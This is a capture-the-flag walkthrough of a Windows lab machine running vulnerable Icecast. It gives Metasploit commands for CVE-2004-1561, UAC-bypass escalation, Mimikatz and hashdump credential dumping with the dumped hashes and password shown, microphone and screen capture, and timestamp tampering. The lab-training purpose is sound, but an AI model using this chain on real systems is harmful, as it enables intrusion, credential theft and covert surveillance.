---
Difficolty: Easy
OS: Window
Platform: THM
---

## Recon
Scan all TCP port on the target using a SYN scan 
```bash
sudo nmap -sS -p- -T4 10.10.181.151 -oN nmap.txt    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-25 18:16 EDT
Stats: 0:02:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 94.84% done; ETC: 18:18 (0:00:07 remaining)
Nmap scan report for 10.10.181.151 (10.10.181.151)
Host is up (0.079s latency).
Not shown: 65523 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5357/tcp  open  wsdapi
8000/tcp  open  http-alt
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49159/tcp open  unknown
49160/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 128.57 seconds

```

In the **``3389``** port is running the Microsoft Remote Desktop (MSRDP).

Now running the scan version to achieve more information about the open ports

````bash
sudo nmap -sV -p 135,139,445,3389,5357,8000,49152,49153,49154,49158,49159,49160 10.10.181.151
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-25 18:22 EDT
Nmap scan report for 10.10.181.151 (10.10.181.151)
Host is up (0.049s latency).

PORT      STATE SERVICE        VERSION
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds   Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server?
5357/tcp  open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp  open  http           Icecast streaming media server
49152/tcp open  msrpc          Microsoft Windows RPC
49153/tcp open  msrpc          Microsoft Windows RPC
49154/tcp open  msrpc          Microsoft Windows RPC
49158/tcp open  msrpc          Microsoft Windows RPC
49159/tcp open  msrpc          Microsoft Windows RPC
49160/tcp open  msrpc          Microsoft Windows RPC
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.11 seconds

````

Notice under the ``8000`` port is running the **Icecast service**
The hostname of the target machine is `DARK-PC`

## Gain Access
1) Now that we've identified some interesting services running on our target machine, let's do a little bit of research into one of the weirder services identified: Icecast. Icecast, or well at least this version running on our target, is heavily flawed and has a high level vulnerability with a score of 7.5 (7.4 depending on where you view it). What is the **Impact Score** for this vulnerability? Use [https://www.cvedetails.com](https://www.cvedetails.com/) for this question and the next.
Search icecast on the [https://www.cvedetails.com](https://www.cvedetails.com/) and click on "vulnerabilities" and click where the score is 7.5.

![[Pasted image 20241026004125.png]]

![[Pasted image 20241026004100.png]]
The score of that vulnerability is: `6.4`

2) What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000

![[Pasted image 20241026003843.png]]


The CVE (Common Vulnerability Exploit) is: `CVE-2004-1561`


3) Following selecting our module, we now have to check what options we have to set. Run the command `show options`. What is the only required setting which currently is blank?
![[Pasted image 20241026004246.png]]

The exploit path on the msf is `exploit/windows/http/icecast_header`


4) Following selecting our module, we now have to check what options we have to set. Run the command `show options`. What is the only required setting which currently is blank?
![[Pasted image 20241026004502.png]]

The only required setting is: `RHOSTS`

Set the **RHOST** with the target machine's ip and **LHOST** with the ip address of kali machine. The correct ip to use is the tun0's interface because i'm over a VPN 
![[Pasted image 20241026005157.png]]


To lanch exploit use `run` command, now i obtain the meterpreter shell.
![[Pasted image 20241026005544.png]]

## Escalate

1) Woohoo! We've gained a foothold into our victim machine! What's the name of the shell we have now?

The shell is: `meterpreter`.
2) hat user was running that Icecast process? The commands used in this question and the next few are taken directly from the '[Metasploit](https://tryhackme.com/module/metasploit)' module.
![[Pasted image 20241026010508.png]]
Using the `getuid` command we are able to obtain the current user session, the username is: `dark`

3) What build of Windows is the system?

the `sysinfo` command return the specific of the system, the build of this windows instance is: `7601`

![[Pasted image 20241026010837.png]]
4) Now that we know some of the finer details of the system we are working with, let's start escalating our privileges. First, what is the architecture of the process we're running?

The system architecture is `x64`

![[Pasted image 20241026010929.png]]

To check the possible exploit for privilege escalation we can use the `run post/multi/recon/local_exploit_suggester` command 

![[Pasted image 20241026011414.png]]

5) Running the local exploit suggester will return quite a few results for potential escalation exploits. What is the full path (starting with exploit/) for the first returned exploit?

The first exploit returned is: `exploit/windows/local/bypassuac_eventvwr`


let's background the meterpreter shell and use the command 
`use exploit/windows/local/bypassuac_eventvwr ` to select the exploit.
![[Pasted image 20241026011701.png]]
in this module we need to set the **SESSION** setting (when we put in background the shell they go under the sessions and are visble with the `sessions` command) in my case 3, set the **LHOST** and the payload has already set.
After setup all `run` the module.

Following completion of the privilege escalation a new session will be opened. Interact with it now using the command `sessions SESSION_NUMBER`

6) We can now verify that we have expanded permissions using the command `getprivs`. What permission listed allows us to take ownership of files?

![[Pasted image 20241026012608.png]]

The permission permit that is the `SeTakeOwnershipPrivilege`.

## Looting
Prior to further action, we need to move to a process that actually has the permissions that we need to interact with the lsass service, the service responsible for authentication within Windows. First, let's list the processes using the command `ps`. Note, we can see processes being run by NT AUTHORITY\SYSTEM as we have escalated permissions (even though our process doesn't).
![[Pasted image 20241026012838.png]]

In order to interact with lsass we need to be 'living in' a process that is the same architecture as the lsass service (x64 in the case of this machine) and a process that has the same permissions as lsass. The printer spool service happens to meet our needs perfectly for this and it'll restart if we crash it! What's the name of the printer service?

Mentioned within this question is the term 'living in' a process. Often when we take over a running program we ultimately load another shared library into the program (a dll) which includes our malicious code. From this, we can spawn a new thread that hosts our shell.

The spool's name service is: `spoolsv.exe`
![[Pasted image 20241026013215.png]]

Migrate to this process now with the command `migrate -N spoolsv.exe`
![[Pasted image 20241026013325.png]]

Let's check what user we are now with the command `getuid`. 
![[Pasted image 20241026013417.png]]

Now that we've made our way to full administrator permissions we'll set our sights on looting. Mimikatz is a rather infamous password dumping tool that is incredibly useful. Load it now using the command `load kiwi` (Kiwi is the updated version of Mimikatz)
![[Pasted image 20241026013514.png]]

Loading kiwi into our meterpreter session will expand our help menu, take a look at the newly added section of the help menu now via the command `help`.

![[Pasted image 20241026013549.png]]

The `cred_all` command is used for retrive all credential in memory.
Run this command now.Mimikatz allows us to steal this password out of memory even without the user 'Dark' logged in as there is a scheduled task that runs the Icecast as the user 'Dark'. It also helps that Windows Defender isn't running on the box ;) (Take a look again at the ps list, this box isn't in the best shape with both the firewall and defender disabled)
![[Pasted image 20241026013942.png]]
The password of dark user is: `Password01!`

## Post-Exploitation

Before we start our post-exploitation, let's revisit the help menu one last time in the meterpreter shell. We'll answer the following questions using that menu.

the `hashdump` command allows us to dump all of the password hashes stored on the system.

![[Pasted image 20241026014154.png]]
![[Pasted image 20241026014308.png]]
```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Dark:1000:aad3b435b51404eeaad3b435b51404ee:7c4fe5eada682714a036e39378362bab:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

```

With the command `screenshare` allows to watch desktop in real time.
![[Pasted image 20241026014808.png]]

With the command `record_mic` allows record audio from a default microphone for X seconds
![[Pasted image 20241026014948.png]]

With the command `timestomp` allows to complicate forensics efforts we can modify timestamps of files on the system

![[Pasted image 20241026015125.png]]

**Golden ticket attacks** are a function within Mimikatz which abuses a component to Kerberos (the authentication system in Windows domains), the ticket-granting ticket. In short, golden ticket attacks allow us to maintain persistence and authenticate as any user on the domain, the `golden_ticket_create` allow us to perfom a golden ticket attacks.

![[Pasted image 20241026015340.png]]

One last thing to note. As we have the password for the user 'Dark' we can now authenticate to the machine and access it via remote desktop (MSRDP). As this is a workstation, we'd likely kick whatever user is signed onto it off if we connect to it, however, it's always interesting to remote into machines and view them as their users do. If this hasn't already been enabled, we can enable it via the following Metasploit module: `run post/windows/manage/enable_rdp`

This is the command to achieve that `xfreerdp /u:Dark /p:Password01 /v:10.10.181.151 /dynamic-resolution`.

## Extra Credit
Explore manual exploitation via exploit code found on exploit-db. 

Exploit link: [https://www.exploit-db.com/exploits/568](https://www.exploit-db.com/exploits/568)

![](https://i.imgur.com/6qXEWDF.png)

  

To learn more about alternative exploitation methods, check out the sequel to this room [Blaster](https://tryhackme.com/room/blaster)!

Answer the questions below

As you advance in your pentesting skills, you will be faced eventually with exploitation without the usage of Metasploit. Provided above is the link to one of the exploits found on Exploit DB for hijacking Icecast for remote code execution. While not required by the room, it's recommended to attempt exploitation via the provided code or via another similar exploit to further hone your skills.